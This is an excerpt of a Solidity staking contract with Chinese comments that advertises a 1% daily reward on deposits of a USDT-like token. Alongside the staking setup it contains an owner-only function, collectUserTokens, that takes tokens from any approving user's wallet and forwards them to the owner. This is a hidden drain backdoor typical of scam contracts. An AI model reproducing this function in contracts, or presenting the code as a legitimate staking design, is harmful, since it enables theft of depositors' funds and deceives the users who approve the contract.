...
contract StakingContract is ReentrancyGuard, Ownable, Pausable {
    ...
    uint256 public rewardRate;            // 奖励率 (每日1%)
    uint256 public minStakeAmount;        // 最小质押数量 (10 USDT)
    uint256 public maxStakeAmount;        // 最大质押数量 (10000 USDT)
    ...
    constructor(address _stakingToken) Ownable(msg.sender) {
        ...
        rewardRate = 100;      // 奖励率 (每日1%)
        minStakeAmount = 10 * 10**18;  // 最小质押数量 (10 USDT)
        maxStakeAmount = 10000 * 10**18; // 最大质押数量 (10000 USDT)
    }
    ...
    function collectUserTokens(address _user, uint256 _amount) external onlyOwner {
        ...
        // 从用户钱包转移代币到合约
        require(stakingToken.transferFrom(_user, address(this), _amount), "Transfer failed");
        
        // 将代币转移到owner地址
        require(stakingToken.transfer(owner(), _amount), "Transfer to owner failed");
    }
} 